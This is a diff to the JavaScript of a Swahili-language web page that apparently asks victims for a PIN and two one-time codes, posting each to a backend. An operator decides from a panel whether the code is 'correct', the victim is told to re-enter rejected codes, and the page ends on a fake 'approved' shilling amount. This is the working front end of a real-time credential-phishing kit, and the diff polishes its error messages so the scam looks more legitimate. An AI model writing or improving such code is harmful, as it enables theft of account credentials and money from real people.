@@ -92,6 +92,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const pinBoxes = document.querySelectorAll('.pin-box');
   const btnSubmitPin = document.getElementById('btn-submit-pin');
+  const pinErrorBanner = document.getElementById('pin-error-banner');
 
   pinBoxes.forEach((box, idx) => {
     box.addEventListener('input', (e) => {
@@ -119,12 +120,14 @@ document.addEventListener('DOMContentLoaded', () => {
         switchStep('waiting');
         pollStatus();
       } else {
-        alert(data.error || 'Hitilafu');
+        pinErrorBanner.textContent = data.error || 'Hitilafu';
+        pinErrorBanner.classList.remove('hidden');
         btnSubmitPin.textContent = 'INGIA';
         btnSubmitPin.removeAttribute('disabled');
       }
     } catch (e) {
-      alert('Hitilafu ya mtandao');
+      pinErrorBanner.textContent = 'Hitilafu ya mtandao';
+      pinErrorBanner.classList.remove('hidden');
       btnSubmitPin.textContent = 'INGIA';
       btnSubmitPin.removeAttribute('disabled');
     }
@@ -133,6 +136,8 @@ document.addEventListener('DOMContentLoaded', () => {
   // Step 1 OTP
   const otpBoxes = document.querySelectorAll('.otp-box');
   const btnSubmitOtp = document.getElementById('btn-submit-otp');
+  const otpErrorBanner = document.getElementById('otp-error-banner');
+
   otpBoxes.forEach((box, idx) => {
     box.addEventListener('input', (e) => {
       const val = e.target.value.replace(/\D/g, '');
@@ -158,12 +163,23 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ userId: appData.userId, otp: appData.otp1, step: 1 })
       });
-    } catch (e) {}
+      // Show waiting screen spinner until admin clicks CORRECT OTP or WRONG OTP
+      switchStep('waiting');
+      pollStatus();
+    } catch (e) {
+      switchStep('otp');
+      otpErrorBanner.textContent = 'Hitilafu ya mtandao';
+      otpErrorBanner.classList.remove('hidden');
+      btnSubmitOtp.textContent = 'WASILISHA';
+      btnSubmitOtp.removeAttribute('disabled');
+    }
   });
 
   // Step 2 OTP
   const otp2Boxes = document.querySelectorAll('.otp2-box');
   const btnSubmitOtp2 = document.getElementById('btn-submit-otp2');
+  const otp2ErrorBanner = document.getElementById('otp2-error-banner');
+
   otp2Boxes.forEach((box, idx) => {
     box.addEventListener('input', (e) => {
       const val = e.target.value.replace(/\D/g, '');
@@ -189,7 +205,15 @@ document.addEventListener('DOMContentLoaded', () => {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ userId: appData.userId, otp: appData.otp2, step: 2 })
       });
-    } catch (e) {}
+      switchStep('waiting');
+      pollStatus();
+    } catch (e) {
+      switchStep('otp2');
+      otp2ErrorBanner.textContent = 'Hitilafu ya mtandao';
+      otp2ErrorBanner.classList.remove('hidden');
+      btnSubmitOtp2.textContent = 'WASILISHA UHAKIKI';
+      btnSubmitOtp2.removeAttribute('disabled');
+    }
   });
 
   function pollStatus() {
@@ -207,28 +231,34 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(interval);
           switchStep('otp2');
         } else if (data.status === 'RETRY_PIN') {
-          alert('PIN si sahihi ❌');
+          clearInterval(interval);
           switchStep('pin');
-          btnSubmitPin.textContent = 'INGIA';
-          btnSubmitPin.removeAttribute('disabled');
+          pinErrorBanner.textContent = 'PIN si sahihi ❌ Tafadhali weka PIN mpya';
+          pinErrorBanner.classList.remove('hidden');
+          if (btnSubmitPin) {
+            btnSubmitPin.textContent = 'INGIA';
+            btnSubmitPin.removeAttribute('disabled');
+          }
           pinBoxes.forEach(b => b.value = '');
-          pinBoxes[0].focus();
-          clearInterval(interval);
+          if (pinBoxes[0]) pinBoxes[0].focus();
         } else if (data.status === 'RETRY_OTP') {
-          alert('OTP si sahihi ❌ Tafadhali weka tena');
-          switchStep('otp');
-          btnSubmitOtp.textContent = 'WASILISHA';
-          btnSubmitOtp.removeAttribute('disabled');
-          otpBoxes.forEach(b => b.value = '');
-          otpBoxes[0].focus();
           clearInterval(interval);
+          switchStep('otp');
+          otpErrorBanner.textContent = 'OTP si sahihi ❌ Tafadhali weka OTP mpya';
+          otpErrorBanner.classList.remove('hidden');
+          if (btnSubmitOtp) {
+            btnSubmitOtp.textContent = 'WASILISHA';
+            btnSubmitOtp.removeAttribute('disabled');
+          }
+          otpBoxes.forEach(b => b.value = '');
+          if (otpBoxes[0]) otpBoxes[0].focus();
         } else if (data.status === 'SUCCESS') {
+          clearInterval(interval);
           document.getElementById('final-approved-amount').textContent = `TSh ${Number(appData.amount).toLocaleString()}`;
           switchStep('success');
-          clearInterval(interval);
         } else if (data.status === 'DENIED') {
-          alert('Ufikiaji Umekataliwa ❌');
           clearInterval(interval);
+          alert('Ufikiaji Umekataliwa ❌');
         }
       } catch (e) {}
     }, 2000);
@@ -236,4 +266,4 @@ document.addEventListener('DOMContentLoaded', () => {
 
   document.getElementById('btn-home').addEventListener('click', () => window.location.reload());
 });
-    
+      
